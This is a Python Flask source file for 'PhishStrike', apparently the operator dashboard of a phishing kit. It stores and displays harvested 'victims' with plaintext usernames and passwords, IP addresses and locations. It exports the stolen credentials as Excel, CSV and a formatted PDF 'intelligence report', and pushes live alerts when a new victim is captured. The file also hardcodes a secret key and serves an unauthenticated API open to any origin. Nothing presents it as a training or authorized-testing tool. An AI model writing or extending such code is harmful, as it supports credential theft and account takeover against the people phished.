from flask import Flask, render_template, jsonify, send_file, request
from flask_socketio import SocketIO
import sys
import os
import io
from datetime import datetime

# Add parent directory to path to import database
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import database

app = Flask(__name__)
app.config["SECRET_KEY"] = "phishstrike_secret_2025"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/victims")
def get_victims():
    victims = database.get_all_victims()
    data = []
    for v in victims:
        data.append(
            {
                "id": v[0],
                "platform": v[1],
                "username": v[2],
                "password": v[3],
                "ip": v[4],
                "timestamp": v[5],
                "ua": v[6] if v[6] else "Unknown",
                "location": v[7] if v[7] else "Unknown",
            }
        )
    return jsonify(data)


@app.route("/api/stats")
def get_stats():
    stats = database.get_stats()
    return jsonify(stats)


@app.route("/api/delete/<int:victim_id>", methods=["POST"])
def delete_victim(victim_id):
    try:
        database.delete_victim(victim_id)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/delete_all", methods=["POST"])
def delete_all_victims():
    try:
        import sqlite3
        conn = sqlite3.connect(database.DB_PATH)
        conn.execute("DELETE FROM victims")
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export")
def export_excel():
    try:
        import pandas as pd
        victims = database.get_all_victims()
        df = pd.DataFrame(
            victims,
            columns=["ID", "Platform", "Username", "Password", "IP", "Timestamp", "UserAgent", "Location"],
        )
        filename = f"phishstrike_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "auth", filename)
        df.to_excel(path, index=False)
        return send_file(path, as_attachment=True, download_name=filename)
    except ImportError:
        return jsonify({"status": "error", "message": "pandas not installed"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_csv")
def export_csv():
    try:
        victims = database.get_all_victims()
        lines = ["ID,Platform,Username,Password,IP,Timestamp,UserAgent,Location"]
        for v in victims:
            row = [str(x).replace(",", ";") if x else "" for x in v]
            lines.append(",".join(row))
        csv_content = "\n".join(lines)
        buf = io.BytesIO(csv_content.encode("utf-8"))
        filename = f"phishstrike_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="text/csv")
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_pdf")
def export_pdf():
    try:
        from fpdf import FPDF

        victims = database.get_all_victims()

        class PDF(FPDF):
            def header(self):
                self.set_font("Helvetica", "B", 16)
                self.set_text_color(0, 242, 255)  # Cyan
                self.cell(0, 10, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
                self.set_font("Helvetica", "I", 10)
                self.set_text_color(128, 128, 128)
                self.cell(0, 10, f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 0, 1, "C")
                self.ln(10)

            def footer(self):
                self.set_y(-15)
                self.set_font("Helvetica", "I", 8)
                self.set_text_color(128, 128, 128)
                self.cell(0, 10, f"Page {self.page_no()} | PhishStrike Advanced Dashboard", 0, 0, "C")

        pdf = PDF()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.add_page()
        pdf.set_font("Helvetica", "B", 10)

        # Table Header
        pdf.set_fill_color(30, 41, 59)  # Dark Blue-Gray
        pdf.set_text_color(255, 255, 255)
        pdf.cell(10, 10, "ID", 1, 0, "C", True)
        pdf.cell(25, 10, "Platform", 1, 0, "C", True)
        pdf.cell(40, 10, "Username", 1, 0, "C", True)
        pdf.cell(40, 10, "Password", 1, 0, "C", True)
        pdf.cell(30, 10, "IP Address", 1, 0, "C", True)
        pdf.cell(45, 10, "Captured At", 1, 1, "C", True)

        # Table Rows
        pdf.set_font("Helvetica", "", 9)
        pdf.set_text_color(0, 0, 0)
        pdf.set_fill_color(248, 250, 252)
        
        fill = False
        for v in victims:
            pdf.cell(10, 10, str(v[0]), 1, 0, "C", fill)
            pdf.cell(25, 10, str(v[1]), 1, 0, "C", fill)
            pdf.cell(40, 10, str(v[2])[:20], 1, 0, "L", fill)
            pdf.cell(40, 10, str(v[3])[:20], 1, 0, "L", fill)
            pdf.cell(30, 10, str(v[4]), 1, 0, "C", fill)
            pdf.cell(45, 10, str(v[5]), 1, 1, "C", fill)
            fill = not fill

        buf = io.BytesIO(pdf.output())
        filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="application/pdf")
    except ImportError:
        return jsonify({"status": "error", "message": "fpdf2 not installed"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/refresh")
def refresh():
    socketio.emit("new_victim", {"status": "refresh"})
    return jsonify({"status": "ok"})


def notify_new_victim(data):
    socketio.emit("new_victim", data)


if __name__ == "__main__":
    database.init_db()
    print("\033[1;38;2;0;255;255m[*] PhishStrike Dashboard running at http://localhost:5000\033[0m")
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, allow_unsafe_werkzeug=True)
